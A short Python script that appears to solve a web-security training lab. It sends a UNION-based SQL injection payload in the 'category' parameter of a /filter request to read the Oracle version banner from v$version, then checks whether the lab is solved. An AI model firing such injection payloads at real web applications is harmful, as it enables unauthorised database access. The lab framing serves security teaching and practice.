from base.base import Base

class SQL(Base):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    def _add_args(self):
        pass

    def run(self):      
        self.params = {'category': "Gifts' union select banner, banner from v$version --"}
        response = self.session.get(f"{self.base_url}/filter", params=self.params)

        if self.verbose:
            self.log(f"Response status code: {response.status_code}", "info")

        self.is_lab_solved()
        


if __name__ == "__main__":
    sql = SQL()
    sql.run()